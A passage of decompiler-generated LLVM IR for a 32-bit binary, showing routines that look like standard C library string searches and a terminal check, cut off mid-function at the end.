  uselistorder label %dec_label_pc_150b4, { 1, 0 }
}

define i32 @function_150c0() local_unnamed_addr {
dec_label_pc_150c0:
  %stack_var_-16 = alloca i32, align 4
  %v3_150c0 = load i32, i32* @r4, align 4
  store i32 %v3_150c0, i32* %stack_var_-16, align 4
  %v6_150c0 = load i32, i32* @r5, align 4
  %v9_150c0 = load i32, i32* @r6, align 4
  %v0_150c4 = load i32, i32* @r0, align 4
  %v0_150c8 = load i32, i32* @r1, align 4
  store i32 %v0_150c8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_150e48 = inttoptr i32 %v0_150c4 to i8*
  %v2_150e49 = load i8, i8* %v1_150e48, align 1
  %v2_150e811 = icmp eq i8 %v2_150e49, 0
  store i32 %v0_150c8, i32* @r0, align 4
  %v1_150f012 = add i32 %v0_150c4, 1
  store i32 %v1_150f012, i32* @r4, align 4
  br i1 %v2_150e811, label %dec_label_pc_150f8, label %dec_label_pc_150d4

dec_label_pc_150d4:                               ; preds = %dec_label_pc_150c0, %dec_label_pc_150e0
  %v3_150e414.in = phi i8 [ %v2_150e4, %dec_label_pc_150e0 ], [ %v2_150e49, %dec_label_pc_150c0 ]
  %v0_150ec13 = phi i32 [ %v0_150ec.pre, %dec_label_pc_150e0 ], [ %v0_150c8, %dec_label_pc_150c0 ]
  %v3_150e414 = zext i8 %v3_150e414.in to i32
  %v2_150d4 = call i32 @function_1528c(i32 %v0_150ec13, i32 %v3_150e414)
  %v2_150d8 = icmp eq i32 %v2_150d4, 0
  %v0_150e0 = load i32, i32* @r5, align 4
  br i1 %v2_150d8, label %dec_label_pc_150e0, label %dec_label_pc_150f8

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150d4
  %v1_150e0 = add i32 %v0_150e0, 1
  %v0_150e4.pre = load i32, i32* @r4, align 4
  %v0_150ec.pre = load i32, i32* @r6, align 4
  store i32 %v1_150e0, i32* @r5, align 4
  %v1_150e4 = inttoptr i32 %v0_150e4.pre to i8*
  %v2_150e4 = load i8, i8* %v1_150e4, align 1
  %v2_150e8 = icmp eq i8 %v2_150e4, 0
  store i32 %v0_150ec.pre, i32* @r0, align 4
  %v1_150f0 = add i32 %v0_150e4.pre, 1
  store i32 %v1_150f0, i32* @r4, align 4
  br i1 %v2_150e8, label %dec_label_pc_150f8, label %dec_label_pc_150d4

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150d4, %dec_label_pc_150c0
  %v0_150f8 = phi i32 [ 0, %dec_label_pc_150c0 ], [ %v0_150e0, %dec_label_pc_150d4 ], [ %v1_150e0, %dec_label_pc_150e0 ]
  %v2_150fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_150fc, i32* @r4, align 4
  store i32 %v6_150c0, i32* @r5, align 4
  store i32 %v9_150c0, i32* @r6, align 4
  ret i32 %v0_150f8

; uselistorder directives
  uselistorder i8 %v2_150e4, { 1, 0 }
  uselistorder i32 %v0_150ec.pre, { 1, 0 }
  uselistorder i32 %v0_150e4.pre, { 1, 0 }
  uselistorder i32* @r6, { 29, 1, 30, 31, 2, 32, 33, 34, 3, 35, 36, 24, 25, 37, 38, 4, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 5, 6, 56, 57, 58, 59, 60, 61, 62, 63, 26, 27, 28, 7, 8, 9, 395, 396, 397, 398, 399, 400, 401, 64, 10, 65, 11, 66, 393, 394, 282, 286, 287, 288, 289, 283, 284, 285, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 290, 315, 316, 317, 291, 292, 293, 294, 295, 12, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 311, 313, 307, 308, 309, 310, 312, 314, 104, 105, 0, 106, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 116, 13, 117, 118, 119, 120, 121, 122, 123, 124, 107, 108, 109, 110, 111, 112, 113, 114, 115, 125, 126, 127, 128, 129, 130, 131, 132, 133, 14, 134, 135, 136, 137, 138, 139, 140, 141, 155, 156, 157, 158, 20, 159, 160, 161, 15, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 23, 16, 176, 177, 179, 180, 178, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 17, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 22, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 21, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 18, 19, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392 }
  uselistorder label %dec_label_pc_150d4, { 1, 0 }
}

define i32 @function_15104(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15104:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_151342 = load i32, i32* @r0, align 4
  %v1_151343 = inttoptr i32 %v0_151342 to i8*
  %v2_151344 = load i8, i8* %v1_151343, align 1
  %v3_151345 = zext i8 %v2_151344 to i32
  store i32 %v3_151345, i32* @ip, align 4
  %v2_151386 = icmp eq i8 %v2_151344, 0
  br i1 %v2_151386, label %dec_label_pc_15144, label %dec_label_pc_15118.preheader

dec_label_pc_15110:                               ; preds = %dec_label_pc_15118
  %v3_15118 = zext i8 %v2_15118 to i32
  %v1_15120 = add i32 %v0_15120, 1
  %v9_15110 = icmp eq i32 %v0_1511010, %v3_15118
  br i1 %v9_15110, label %dec_label_pc_1512c, label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %dec_label_pc_15118.preheader, %dec_label_pc_15110
  %v0_15120 = phi i32 [ %tmp, %dec_label_pc_15118.preheader ], [ %v1_15120, %dec_label_pc_15110 ]
  %v1_15118 = inttoptr i32 %v0_15120 to i8*
  %v2_15118 = load i8, i8* %v1_15118, align 1
  %v2_1511c = icmp eq i8 %v2_15118, 0
  br i1 %v2_1511c, label %dec_label_pc_15144, label %dec_label_pc_15110

dec_label_pc_1512c:                               ; preds = %dec_label_pc_15110
  %v1_1512c = add i32 %v0_1512c, 1
  %v1_15130 = add i32 %v0_15130, 1
  %v1_15134 = inttoptr i32 %v1_15130 to i8*
  %v2_15134 = load i8, i8* %v1_15134, align 1
  %v3_15134 = zext i8 %v2_15134 to i32
  store i32 %v3_15134, i32* @ip, align 4
  %v2_15138 = icmp eq i8 %v2_15134, 0
  br i1 %v2_15138, label %dec_label_pc_15144, label %dec_label_pc_15118.preheader

dec_label_pc_15118.preheader:                     ; preds = %dec_label_pc_15104, %dec_label_pc_1512c
  %v0_15130 = phi i32 [ %v1_15130, %dec_label_pc_1512c ], [ %v0_151342, %dec_label_pc_15104 ]
  %v0_1512c = phi i32 [ %v1_1512c, %dec_label_pc_1512c ], [ 0, %dec_label_pc_15104 ]
  %v0_1511010 = phi i32 [ %v3_15134, %dec_label_pc_1512c ], [ %v3_151345, %dec_label_pc_15104 ]
  br label %dec_label_pc_15118

dec_label_pc_15144:                               ; preds = %dec_label_pc_1512c, %dec_label_pc_15118, %dec_label_pc_15104
  %v0_15144 = phi i32 [ 0, %dec_label_pc_15104 ], [ %v0_1512c, %dec_label_pc_15118 ], [ %v1_1512c, %dec_label_pc_1512c ]
  ret i32 %v0_15144

; uselistorder directives
  uselistorder i32 %v0_15120, { 1, 0 }
  uselistorder label %dec_label_pc_15118.preheader, { 1, 0 }
}

define i32 @function_15150(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15150:
  store i32 %arg1, i32* @r0, align 4
  %v1_15154 = urem i32 %arg2, 256
  store i32 %v1_15154, i32* @r4, align 4
  %v2_15154 = icmp eq i32 %v1_15154, 0
  br i1 %v2_15154, label %dec_label_pc_15168, label %dec_label_pc_1517c.preheader

dec_label_pc_1517c.preheader:                     ; preds = %dec_label_pc_15150
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_151843 = call i32 @function_1528c(i32 %arg1, i32 %v1_15154)
  %v2_151885 = icmp eq i32 %v2_151843, 0
  br i1 %v2_151885, label %dec_label_pc_15190, label %dec_label_pc_15174

dec_label_pc_15168:                               ; preds = %dec_label_pc_15150
  %v2_1516c = call i32 @function_1528c(i32 %arg1, i32 0)
  br label %dec_label_pc_15194

dec_label_pc_15174:                               ; preds = %dec_label_pc_1517c.preheader, %dec_label_pc_15174
  %v2_151846 = phi i32 [ %v2_15184, %dec_label_pc_15174 ], [ %v2_151843, %dec_label_pc_1517c.preheader ]
  store i32 %v2_151846, i32* @r5, align 4
  %v1_15178 = add i32 %v2_151846, 1
  store i32 %v1_15178, i32* @r0, align 4
  %v0_15180 = load i32, i32* @r4, align 4
  %v2_15184 = call i32 @function_1528c(i32 %v1_15178, i32 %v0_15180)
  %v2_15188 = icmp eq i32 %v2_15184, 0
  br i1 %v2_15188, label %dec_label_pc_15190, label %dec_label_pc_15174

dec_label_pc_15190:                               ; preds = %dec_label_pc_15174, %dec_label_pc_1517c.preheader
  %v0_15190 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15194

dec_label_pc_15194:                               ; preds = %dec_label_pc_15168, %dec_label_pc_15190
  %storemerge = phi i32 [ %v2_1516c, %dec_label_pc_15168 ], [ %v0_15190, %dec_label_pc_15190 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15184, { 1, 0 }
  uselistorder i32 %v1_15178, { 1, 0 }
  uselistorder i32 %v1_15154, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1528c, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15194, { 1, 0 }
  uselistorder label %dec_label_pc_15174, { 1, 0 }
}

define i32 @function_151a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_151a0:
  %v1_151a4 = urem i32 %arg1, 256
  %v0_151c42 = load i32, i32* @r0, align 4
  %v1_151c43 = urem i32 %v0_151c42, 4
  %v2_151c44 = icmp eq i32 %v1_151c43, 0
  br i1 %v2_151c44, label %dec_label_pc_151cc, label %dec_label_pc_151ac

dec_label_pc_151ac:                               ; preds = %dec_label_pc_151a0, %dec_label_pc_151c0
  %v0_151c0 = phi i32 [ %v1_151c0, %dec_label_pc_151c0 ], [ %v0_151c42, %dec_label_pc_151a0 ]
  %v1_151ac = inttoptr i32 %v0_151c0 to i8*
  %v2_151ac = load i8, i8* %v1_151ac, align 1
  %v3_151ac = zext i8 %v2_151ac to i32
  %v9_151b0 = icmp eq i32 %v3_151ac, %v1_151a4
  br i1 %v9_151b0, label %dec_label_pc_1527c, label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151ac
  %v2_151b8 = icmp eq i8 %v2_151ac, 0
  br i1 %v2_151b8, label %dec_label_pc_1527c, label %dec_label_pc_151c0

dec_label_pc_151c0:                               ; preds = %dec_label_pc_151b8
  %v1_151c0 = add i32 %v0_151c0, 1
  %v1_151c4 = urem i32 %v1_151c0, 4
  %v2_151c4 = icmp eq i32 %v1_151c4, 0
  br i1 %v2_151c4, label %dec_label_pc_151cc, label %dec_label_pc_151ac

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151c0, %dec_label_pc_151a0
  %v0_151d0 = phi i32 [ %v0_151c42, %dec_label_pc_151a0 ], [ %v1_151c0, %dec_label_pc_151c0 ]
  %v4_151cc = mul nuw nsw i32 %v1_151a4, 256
  %v5_151cc = or i32 %v4_151cc, %v1_151a4
  %v4_151d4 = mul i32 %v5_151cc, 65536
  %v5_151d4 = or i32 %v4_151d4, %v5_151cc
  br label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_15274, %dec_label_pc_15214, %dec_label_pc_151cc
  %v0_1523c = phi i32 [ %v0_151d0, %dec_label_pc_151cc ], [ %v4_151d8, %dec_label_pc_15214 ], [ %v4_151d8, %dec_label_pc_15274 ]
  %v1_151d8 = inttoptr i32 %v0_1523c to i32*
  %v2_151d8 = load i32, i32* %v1_151d8, align 4
  %v4_151d8 = add i32 %v0_1523c, 4
  %v2_151e0 = xor i32 %v2_151d8, %v5_151d4
  %v2_151e4 = add i32 %v2_151e0, 2130640639
  store i32 %v2_151e4, i32* @ip, align 4
  %v2_151ec = add i32 %v2_151d8, 2130640639
  %v1_151f0 = sub i32 -1, %v2_151d8
  %v2_151f4 = xor i32 %v2_151ec, %v1_151f0
  %v2_15200 = and i32 %v2_151f4, -2130640640
  %v2_15208 = icmp eq i32 %v2_15200, 0
  br i1 %v2_15208, label %dec_label_pc_15214, label %dec_label_pc_1521c

dec_label_pc_15214:                               ; preds = %dec_label_pc_151d8
  %v1_151fc = sub i32 -1, %v2_151e0
  %v2_15204 = xor i32 %v2_151e4, %v1_151fc
  %v2_1520c = and i32 %v2_15204, -2130640640
  %v2_15214 = icmp eq i32 %v2_1520c, 0
  br i1 %v2_15214, label %dec_label_pc_151d8, label %dec_label_pc_1521c

dec_label_pc_1521c:                               ; preds = %dec_label_pc_151d8, %dec_label_pc_15214
  %v2_1521c = inttoptr i32 %v0_1523c to i8*
  %v3_1521c = load i8, i8* %v2_1521c, align 1
  %v4_1521c = zext i8 %v3_1521c to i32
  %v9_15220 = icmp eq i32 %v4_1521c, %v1_151a4
  br i1 %v9_15220, label %dec_label_pc_1527c, label %dec_label_pc_1522c

dec_label_pc_1522c:                               ; preds = %dec_label_pc_1521c
  %v2_1522c = icmp eq i8 %v3_1521c, 0
  br i1 %v2_1522c, label %dec_label_pc_1527c, label %dec_label_pc_15234

dec_label_pc_15234:                               ; preds = %dec_label_pc_1522c
  %v1_15234 = add i32 %v0_1523c, 1
  %v2_15234 = inttoptr i32 %v1_15234 to i8*
  %v3_15234 = load i8, i8* %v2_15234, align 1
  %v4_15234 = zext i8 %v3_15234 to i32
  %v9_15238 = icmp eq i32 %v4_15234, %v1_151a4
  br i1 %v9_15238, label %dec_label_pc_1527c, label %dec_label_pc_15244

dec_label_pc_15244:                               ; preds = %dec_label_pc_15234
  %v2_15244 = icmp eq i8 %v3_15234, 0
  br i1 %v2_15244, label %dec_label_pc_1527c, label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %dec_label_pc_15244
  %v1_1524c = add i32 %v0_1523c, 2
  %v2_1524c = inttoptr i32 %v1_1524c to i8*
  %v3_1524c = load i8, i8* %v2_1524c, align 1
  %v4_1524c = zext i8 %v3_1524c to i32
  %v9_15250 = icmp eq i32 %v4_1524c, %v1_151a4
  br i1 %v9_15250, label %dec_label_pc_1527c, label %dec_label_pc_1525c

dec_label_pc_1525c:                               ; preds = %dec_label_pc_1524c
  %v2_1525c = icmp eq i8 %v3_1524c, 0
  br i1 %v2_1525c, label %dec_label_pc_1527c, label %dec_label_pc_15264

dec_label_pc_15264:                               ; preds = %dec_label_pc_1525c
  %v1_15264 = add i32 %v0_1523c, 3
  %v2_15264 = inttoptr i32 %v1_15264 to i8*
  %v3_15264 = load i8, i8* %v2_15264, align 1
  %v4_15264 = zext i8 %v3_15264 to i32
  %v9_15268 = icmp eq i32 %v4_15264, %v1_151a4
  br i1 %v9_15268, label %dec_label_pc_1527c, label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %dec_label_pc_15264
  %v2_15274 = icmp eq i8 %v3_15264, 0
  br i1 %v2_15274, label %dec_label_pc_1527c, label %dec_label_pc_151d8

dec_label_pc_1527c:                               ; preds = %dec_label_pc_151b8, %dec_label_pc_151ac, %dec_label_pc_15274, %dec_label_pc_15264, %dec_label_pc_1525c, %dec_label_pc_1524c, %dec_label_pc_15244, %dec_label_pc_15234, %dec_label_pc_1522c, %dec_label_pc_1521c
  %v1_15280 = phi i32 [ %v1_15264, %dec_label_pc_15274 ], [ %v1_15264, %dec_label_pc_15264 ], [ %v1_1524c, %dec_label_pc_1525c ], [ %v1_1524c, %dec_label_pc_1524c ], [ %v1_15234, %dec_label_pc_15244 ], [ %v1_15234, %dec_label_pc_15234 ], [ %v0_1523c, %dec_label_pc_1522c ], [ %v0_1523c, %dec_label_pc_1521c ], [ %v0_151c0, %dec_label_pc_151ac ], [ %v0_151c0, %dec_label_pc_151b8 ]
  ret i32 %v1_15280

; uselistorder directives
  uselistorder i32 %v4_151d8, { 1, 0 }
  uselistorder i32 %v2_151d8, { 0, 2, 1 }
  uselistorder i32 %v0_1523c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_151cc, { 1, 0 }
  uselistorder i32 %v1_151c0, { 1, 0, 2 }
  uselistorder i32 %v0_151c42, { 2, 1, 0 }
  uselistorder i32 %v1_151a4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1527c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1521c, { 1, 0 }
  uselistorder label %dec_label_pc_151ac, { 1, 0 }
}

define i32 @function_1528c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1528c:
  %v1_15290 = urem i32 %arg1, 256
  %v0_152b03 = load i32, i32* @r0, align 4
  %v1_152b04 = urem i32 %v0_152b03, 4
  %v2_152b05 = icmp eq i32 %v1_152b04, 0
  br i1 %v2_152b05, label %dec_label_pc_152b8, label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_1528c, %dec_label_pc_152ac
  %v0_152ac = phi i32 [ %v1_152ac, %dec_label_pc_152ac ], [ %v0_152b03, %dec_label_pc_1528c ]
  %v1_15298 = inttoptr i32 %v0_152ac to i8*
  %v2_15298 = load i8, i8* %v1_15298, align 1
  %v3_15298 = zext i8 %v2_15298 to i32
  %v9_1529c = icmp eq i32 %v3_15298, %v1_15290
  br i1 %v9_1529c, label %dec_label_pc_1536c, label %dec_label_pc_152a4

dec_label_pc_152a4:                               ; preds = %dec_label_pc_15298
  %v2_152a4 = icmp eq i8 %v2_15298, 0
  br i1 %v2_152a4, label %dec_label_pc_15368, label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %dec_label_pc_152a4
  %v1_152ac = add i32 %v0_152ac, 1
  %v1_152b0 = urem i32 %v1_152ac, 4
  %v2_152b0 = icmp eq i32 %v1_152b0, 0
  br i1 %v2_152b0, label %dec_label_pc_152b8, label %dec_label_pc_15298

dec_label_pc_152b8:                               ; preds = %dec_label_pc_152ac, %dec_label_pc_1528c
  %v0_152bc = phi i32 [ %v0_152b03, %dec_label_pc_1528c ], [ %v1_152ac, %dec_label_pc_152ac ]
  %v4_152b8 = mul nuw nsw i32 %v1_15290, 256
  %v5_152b8 = or i32 %v4_152b8, %v1_15290
  %v4_152c0 = mul i32 %v5_152b8, 65536
  %v5_152c0 = or i32 %v4_152c0, %v5_152b8
  br label %dec_label_pc_152c4

dec_label_pc_152c4:                               ; preds = %dec_label_pc_15360, %dec_label_pc_15300, %dec_label_pc_152b8
  %v0_15328 = phi i32 [ %v0_152bc, %dec_label_pc_152b8 ], [ %v4_152c4, %dec_label_pc_15300 ], [ %v4_152c4, %dec_label_pc_15360 ]
  %v1_152c4 = inttoptr i32 %v0_15328 to i32*
  %v2_152c4 = load i32, i32* %v1_152c4, align 4
  %v4_152c4 = add i32 %v0_15328, 4
  %v2_152cc = xor i32 %v2_152c4, %v5_152c0
  %v2_152d0 = add i32 %v2_152cc, 2130640639
  store i32 %v2_152d0, i32* @ip, align 4
  %v2_152d8 = add i32 %v2_152c4, 2130640639
  %v1_152dc = sub i32 -1, %v2_152c4
  %v2_152e0 = xor i32 %v2_152d8, %v1_152dc
  %v2_152ec = and i32 %v2_152e0, -2130640640
  %v2_152f4 = icmp eq i32 %v2_152ec, 0
  br i1 %v2_152f4, label %dec_label_pc_15300, label %dec_label_pc_15308

dec_label_pc_15300:                               ; preds = %dec_label_pc_152c4
  %v1_152e8 = sub i32 -1, %v2_152cc
  %v2_152f0 = xor i32 %v2_152d0, %v1_152e8
  %v2_152f8 = and i32 %v2_152f0, -2130640640
  %v2_15300 = icmp eq i32 %v2_152f8, 0
  br i1 %v2_15300, label %dec_label_pc_152c4, label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %dec_label_pc_152c4, %dec_label_pc_15300
  %v2_15308 = inttoptr i32 %v0_15328 to i8*
  %v3_15308 = load i8, i8* %v2_15308, align 1
  %v4_15308 = zext i8 %v3_15308 to i32
  %v9_1530c = icmp eq i32 %v4_15308, %v1_15290
  br i1 %v9_1530c, label %dec_label_pc_1536c, label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_15308
  %v2_15318 = icmp eq i8 %v3_15308, 0
  br i1 %v2_15318, label %dec_label_pc_15368, label %dec_label_pc_15320

dec_label_pc_15320:                               ; preds = %dec_label_pc_15318
  %v1_15320 = add i32 %v0_15328, 1
  %v2_15320 = inttoptr i32 %v1_15320 to i8*
  %v3_15320 = load i8, i8* %v2_15320, align 1
  %v4_15320 = zext i8 %v3_15320 to i32
  %v9_15324 = icmp eq i32 %v4_15320, %v1_15290
  br i1 %v9_15324, label %dec_label_pc_1536c, label %dec_label_pc_15330

dec_label_pc_15330:                               ; preds = %dec_label_pc_15320
  %v2_15330 = icmp eq i8 %v3_15320, 0
  br i1 %v2_15330, label %dec_label_pc_15368, label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %dec_label_pc_15330
  %v1_15338 = add i32 %v0_15328, 2
  %v2_15338 = inttoptr i32 %v1_15338 to i8*
  %v3_15338 = load i8, i8* %v2_15338, align 1
  %v4_15338 = zext i8 %v3_15338 to i32
  %v9_1533c = icmp eq i32 %v4_15338, %v1_15290
  br i1 %v9_1533c, label %dec_label_pc_1536c, label %dec_label_pc_15348

dec_label_pc_15348:                               ; preds = %dec_label_pc_15338
  %v2_15348 = icmp eq i8 %v3_15338, 0
  br i1 %v2_15348, label %dec_label_pc_15368, label %dec_label_pc_15350

dec_label_pc_15350:                               ; preds = %dec_label_pc_15348
  %v1_15350 = add i32 %v0_15328, 3
  %v2_15350 = inttoptr i32 %v1_15350 to i8*
  %v3_15350 = load i8, i8* %v2_15350, align 1
  %v4_15350 = zext i8 %v3_15350 to i32
  %v9_15354 = icmp eq i32 %v4_15350, %v1_15290
  br i1 %v9_15354, label %dec_label_pc_1536c, label %dec_label_pc_15360

dec_label_pc_15360:                               ; preds = %dec_label_pc_15350
  %v2_15360 = icmp eq i8 %v3_15350, 0
  br i1 %v2_15360, label %dec_label_pc_15368, label %dec_label_pc_152c4

dec_label_pc_15368:                               ; preds = %dec_label_pc_152a4, %dec_label_pc_15360, %dec_label_pc_15348, %dec_label_pc_15330, %dec_label_pc_15318
  br label %dec_label_pc_1536c

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15298, %dec_label_pc_15350, %dec_label_pc_15338, %dec_label_pc_15320, %dec_label_pc_15308, %dec_label_pc_15368
  %v1_15370 = phi i32 [ 0, %dec_label_pc_15368 ], [ %v1_15350, %dec_label_pc_15350 ], [ %v1_15338, %dec_label_pc_15338 ], [ %v1_15320, %dec_label_pc_15320 ], [ %v0_15328, %dec_label_pc_15308 ], [ %v0_152ac, %dec_label_pc_15298 ]
  ret i32 %v1_15370

; uselistorder directives
  uselistorder i32 %v4_152c4, { 1, 0 }
  uselistorder i32 %v2_152c4, { 0, 2, 1 }
  uselistorder i32 %v0_15328, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_152b8, { 1, 0 }
  uselistorder i32 %v1_152ac, { 1, 0, 2 }
  uselistorder i32 %v0_152b03, { 2, 1, 0 }
  uselistorder i32 %v1_15290, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 2, 3, 1, 4, 45, 46, 89, 47, 48, 49, 50, 51, 52, 59, 60, 90, 6, 82, 20, 83, 19, 84, 28, 85, 53, 86, 54, 29, 61, 63, 30, 64, 21, 62, 31, 32, 33, 34, 35, 0, 65, 66, 8, 7, 36, 22, 67, 68, 10, 9, 37, 69, 23, 70, 12, 11, 38, 71, 24, 72, 40, 73, 14, 13, 39, 74, 25, 75, 16, 15, 41, 76, 26, 77, 18, 17, 42, 78, 27, 79, 80, 5, 81, 87, 55, 56, 57, 58, 43, 88, 44 }
  uselistorder i32 2130640639, { 0, 2, 1, 3 }
  uselistorder i32 65536, { 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 117, 120, 116, 121, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 40, 39, 41, 42, 43, 2, 44, 0, 3, 45, 46, 48, 47, 1, 51, 49, 50, 52, 115, 54, 53, 57, 58, 59, 55, 56, 61, 62, 60, 63, 118, 65, 64, 68, 69, 70, 66, 67, 71, 72, 74, 75, 76, 73, 77, 119, 78, 80, 79, 82, 81, 83, 90, 84, 91, 85, 92, 86, 93, 87, 94, 88, 89, 96, 95, 97, 98, 99, 100, 105, 101, 106, 102, 107, 103, 104, 109, 108, 110, 111, 112, 114, 113 }
  uselistorder label %dec_label_pc_1536c, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15368, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15308, { 1, 0 }
  uselistorder label %dec_label_pc_15298, { 1, 0 }
}

define i32 @function_1537c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1537c:
  %stack_var_-68 = alloca i32, align 4
  %v2_15384 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15384, i32* @r1, align 4
  %v0_15388 = call i32 @function_153a0()
  %v1_1538c = sub i32 1, %v0_15388
  %v2_1538c = icmp ult i32 %v0_15388, 2
  br i1 %v2_1538c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_1537c
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_1537c, %bb
  %v1_1539c = phi i32 [ %v1_1538c, %dec_label_pc_1537c ], [ 0, %bb ]
  ret i32 %v1_1539c

; uselistorder directives
  uselistorder i32 %v0_15388, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_153a0() local_unnamed_addr {
dec_label_pc_153a0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_153a0 = load i32, i32* @r4, align 4
  %v6_153a0 = load i32, i32* @r5, align 4
  %v2_153a8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_153ac = load i32, i32* @r1, align 4
  store i32 %v0_153ac, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_153b8 = load i32, i32* @r0, align 4
  %v3_153b8 = call i32 @function_1057c(i32 %v0_153b8, i32 21505, i32 %v2_153a8)
  store i32 %v3_153b8, i32* %r0.global-to-local, align 4
  store i32 %v3_153b8, i32* @r5, align 4
  %v2_153bc = icmp eq i32 %v3_153b8, 0
  br i1 %v2_153bc, label %dec_label_pc_153c4, label %dec_label_pc_15408

dec_label_pc_153c4:                               ; preds = %dec_label_pc_153a0
  %v4_153d0 = zext i8 %tmp to i32
  store i32 %v4_153d0, i32* @ip, align 4
  %v3_153d4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_153d4, i32* @r3, align 4
  %v1_153d8 = load i32, i32* @r4, align 4
  %v2_153d8 = add i32 %v1_153d8, 4
  %v3_153d8 = inttoptr i32 %v2_153d8 to i32*
  %v0_153dc = load i32, i32* %r1.global-to-local, align 4
  %v1_153dc = load i32, i32* @r4, align 4
  %v2_153dc = add i32 %v1_153dc, 8
  %v3_153dc = inttoptr i32 %v2_153dc to i32*
  store i32 %v0_153dc, i32* %v3_153dc, align 4
  %v0_153e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_153e0 = load i32, i32* @r4, align 4
  %v2_153e0 = add i32 %v1_153e0, 12
  %v3_153e0 = inttoptr i32 %v2_153e0 to i32*
  store i32 %v0_153e0, i32* %v3_153e0, align 4
  %v2_153e4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_153e4, i32* @r1, align 4
  %v1_153ec = load i32, i32* @r4, align 4
  %v2_153ec = inttoptr i32 %v1_153ec to i32*
  store i32 %v3_153d4, i32* %v2_153ec, align 4
  %v0_153f0 = load i32, i32* @ip, align 4
  %v1_153f0 = trunc i32 %v0_153f0 to i8
  %v2_153f0 = load i32, i32* @r4, align 4
  %v3_153f0 = add i32 %v2_153f0, 16
  %v4_153f0 = inttoptr i32 %v3_153f0 to i8*
  store i8 %v1_153f0, i8* %v4_153f0, align 1
  %v0_153f4 = load i32, i32* @r4, align 4
  %v1_153f4 = add i32 %v0_153f4, 17
  store i32 %v1_153f4, i32* %r0.global-to-local, align 4
  %v4_153f8 = call i32 @function_158e4(i32 %v1_153f4, i32 %v2_153e4, i32 19, i32 %v3_153d4)
